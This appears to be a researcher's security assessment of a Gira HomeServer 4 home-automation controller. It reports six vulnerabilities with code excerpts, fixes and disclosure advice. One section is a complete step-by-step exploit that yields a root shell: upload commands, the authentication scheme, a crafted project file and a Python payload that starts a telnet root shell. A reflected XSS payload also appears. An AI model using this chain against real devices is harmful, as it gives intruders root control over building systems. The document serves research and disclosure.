# Gira HomeServer 4: security findings

**Scope** one HomeServer 4 (revision D3003, firmware 4.6.0) owned by the assessor,
on a private network. Device identifiers are shown as placeholders like
`<hs4-ip>` or `<serial>`; nothing here identifies a specific site.

---

## Summary

The device runs one process, `hs_main`, as root. It is a Python interpreter that
runs code supplied by a loaded project, so loading a project gives code execution.
Firmware is accepted without signature or checksum checks, over both the network
and the serial update path. The assessment confirmed six issues. Two need no credentials
at all (A, C). One leaks device identity without logging in (D). Two give root code
execution to whoever knows the admin password (E, F). Finding F gave a verified root
shell on this unit.

## Findings

| ID | Problem | Login needed | Severity |
|----|---------|--------------|----------|
| A | Commands run before login finishes | username only | High |
| B | Names of existing users can be listed | none | Low |
| C | Reflected XSS on `/hshtm`, echoes the password | none | Medium |
| D | Device identity leaks via `/HSADMIN?CMD=INIT` | none | Medium |
| E | Firmware written without signature check, plus path traversal | admin password | Critical |
| F | Project formulas are `eval`'d as root | admin password | High |

---

### A: Commands run before login finishes

**Where** `hs_client.py`, `CClientItem.checkNewData()`

The command dispatcher reads `self.userItem.extUserGroup` directly. That field is
filled from the username alone, before any password check. A correct, status-aware
getter exists right next to it but is not called:

```python
def getExtUserGroup(self):
    if self.status > 1 and self.userItem != None:   # the correct check
        return self.userItem.extUserGroup
    return 0
```

**Impact** With just a valid username (no password) a LAN client can send `1|ko|val`
and `2|ko|val` (set/add KNX values), `3`–`6`, `20|seq|1`, `21|scene|…` and `12`/`13`,
using that account's real rights. Reads are gated, writes are not. Matches the 2017
public report; still present on 4.6.0. Verified: `90|admin|` then `94`/`99` gets a
response with no password step. Write opcodes were not fired against a live house.

**Fix** One line: use `self.getExtUserGroup()` in `checkNewData()`, and accept only
opcodes `90`/`92` while `status < 2`.

---

### B: User enumeration oracle

QUAD answers `91|<salt>` for a known user and `91||` for an unknown one.
`/HSADMIN?CMD=INIT` returns XML for a known user and an empty body otherwise (and
adds the caller's IP to a short block list). Only `admin` existed on the tested unit.

**Fix** Return a well-formed response either way; do not differ in content or timing.

---

### C: Reflected XSS in `/hshtm`

Both `user` and `pw` are inserted into the HTML without escaping, and the typed
password is echoed back into the markup:

```
GET /hshtm?user=x%22%3E%3Cscript%3Ealert(1)%3C/script%3E&pw=y%22%20onfocus%3Dalert(2)%20x%3D%22

<input name="user" type="text" value="x"><script>alert(1)</script>" size="30">
<input name="pw" type="password" value="y" onfocus=alert(2) x="" size="30">
```

Same class as CVE-2023-2739 (`hslist`), different page. No login needed.

**Fix** Escape reflected parameters; do not echo the password back.

---

### D: Device identity leaks without login

`doAdminInit()` only checks that the username exists:

```
GET /HSADMIN?CMD=INIT&USER=admin

<HS tan="<tan>"><HND>9999</HND>
<KEY><md5 of serial></KEY><SNO><serial></SNO></HS>
```

`KEY == md5(lower(SNO) + upper(SNO))`, confirmed. The serial is in the same response
(it is the device MAC), so the "key" holds no secret. The call also installs a server
side admin handle.

**Fix** Require authentication before handing out a TAN/handle; derive keys from a
real secret; answer unknown users uniformly.

---

### E: Firmware written without verification, plus path traversal (Critical)

**Where** `hs_load.py`, `CLoad.putFirm()`

The admin upload path takes a ZIP and validates it only by *which filenames appear
in the supplied `INHALT.TXT`*:

```python
if filename == 'DOLINUX2.BAT' and self.MC.isSnowport(): firmware_mode = 2
elif filename == 'VERSION.DAT':                         is_valid_firmware = True

if firmware_mode == 2 and is_valid_firmware:
    os.system('rm -r /fw/*')
    for filename_raw in lines:
        filename = filename_raw.strip()
        pfo = open('/fw/' + filename, 'w+b')      # no path sanitisation
```

No signature, no version check, `md5.chk` never read. Effect: the boot partition
(`/dev/sda2`, mounted at `/fw`) can be replaced, and `../` in a filename writes anywhere
as root. Applies to SATA units (`HardwareType == 2`, `/proc/partitions` shows `sda`);
tested unit was one. IDE units (`hdb`) skip the block.

**Fix** Sign firmware and verify before writing; verify `md5.chk`; reject path
components outside the target directory.

---

### F: Project formulas are evaluated as root

**Where** `hs_logik.py`, `CLogikBSItem.addFormel()` / `calc()`

```python
FormelItem[0] = compile(pElement[3], 'case', 'eval')
FormelItem[1] = compile(pElement[4], 'formula', 'eval')
...
if x[0] == None or eval(x[0]) > 0:
    Wert = eval(x[1])
```

Formulas come straight from the project and run via `eval` inside the root process.
This is an intended feature, but it means project-load permission equals root.
Verified: one added formula ran as root after the automatic reboot.

**Fix** State it in the docs; run `hs_main` as a normal user; restrict the eval
environment (no `__import__`, no builtins).

---

## Getting a shell, step by step

No hardware access, no serial cable, no Windows VM needed. Example, using
`hsadmin.py` (commands also shown in README.md):

```
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --probe      # checks the password path works
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --version 146 --rollback work/prg.dat
telnet <hs4-ip> 2323                                                    # root shell, ~100 s after upload
python3 hsadmin.py --host <hs4-ip> --password '<admin-pw>' --version 146 --rollback work/prg.dat.original   # remove it again
```

What happens internally, in order:

1. `GET /HSADMIN?CMD=INIT&USER=admin` (no credentials) returns `tan` and `hnd`.
2. The upload is one TCP request: `GET /HSADMIN?CMD=UPLOAD&HND=<hnd>&CODE=<code>`,
   header end, then `<4-byte little-endian length><ZIP><32-byte MD5 trailer>`.
   `CODE` is HMAC-MD5 over `CMD=UPLOAD&HND=<hnd>` keyed with the admin password:
   `md5(opad + tan + upper(md5(ipad + tan + sdat)))`. `hsadmin.py` implements this.
3. The ZIP holds `version.dat` (the current protocol number, here `146`) plus
   `prg.dat`. Only three lines are added to the project's logic section, so the rest
   of the 11 MB stays byte-identical. Three lines: one block with `CalcOnInit=1`, one
   formula line carrying the payload, one `6001` gatter instance:

   ```
   5001|29991|0|0|0|0|1
   5012|29991|0|"<case>"|""|""|0|0|0|0
   6001|29991|29991|0|0
   ```

   Case expression (returns 0, so nothing is switched):

   ```python
   (__import__('os').access('/tmp/.tnd',0) or __import__('os').system(
     'touch /tmp/.tnd; mkdir -p /dev/pts; mount -t devpts none /dev/pts; '
     'telnetd -l /bin/sh -p 2323 &')==0) and 0
   ```

4. Upload sets `reset=1`. On boot the logic init loop evaluates every gatter's case,
   the formula runs as root, the telnet shell appears on TCP 2323.

Two things that are easy to get wrong:

- Attaching the payload to existing blocks does nothing: the tested project had 81
  blocks but zero `6001` gatter instances, so no formula ever ran. The gatter line is
  required.
- `/init` never mounts a pty filesystem, so busybox telnetd needs the
  `mount -t devpts none /dev/pts` that the expression above already includes.

## Other observations

- Everything for a shell ships already: static busybox has `telnetd`, `nc`, `httpd`,
  `wget`, and `/init` runs `busybox --install -s`.
- Neither update path checks integrity: the DOS updater keeps `md5sum.exe` next to a
  failure branch it never calls, and the network path ignores `md5.chk` too.
- The licence check reads the MAC from `ifconfig` output, so a script named
  `ifconfig` defeats it. Small thing, typical trust model.
- The whole application is recoverable: 78 modules are frozen Python bytecode inside
  the `hs_main` ELF; all were located via the ELF program headers and decompiled
  (~52,500 lines).

## Platform (read from the running device)

AMD G-T44R @ 1197 MHz, 2 GB RAM, 2 GB SATA disk, kernel 3.16.7-ckt11 (built in 2015),
root filesystem a 35 MB ramdisk, cmdline `root=/dev/ram rw acpi=off`. Partitions:
`sda1` FreeDOS boot, `sda2` firmware, `sda3`/`sda4` project and data. Boot chain:
FreeDOS → `autoexec.bat` → `firmupd.bat` → `dolinux2.bat` → LINLD → kernel + initrd.
Open TCP ports: 80 and 50000 (iETS KNX bridge). ICMP filtered; no KNXnet/IP on UDP 3671.

## What an owner should do now

1. Put the device on its own VLAN; allow TCP 80 only from known hosts. Do not
   port-forward to internet clients.
2. Firewall TCP 50000 to the hosts that need ETS access, or turn iETS off.
3. Set a long unique admin password. Findings E and F mean that password is root.
4. Plan for firmware updates to keep losing custom settings: the update path wipes
   `/fw/*` and there is no signature to lean on.

## Disclosure note

A, C, D and E are worth reporting to the vendor. Gira did not answer the CVE-2023-2739
disclosure on VulDB, so allow for no reply and consider a coordinating body. A, C and D
are quick fixes; treat E as the urgent one.
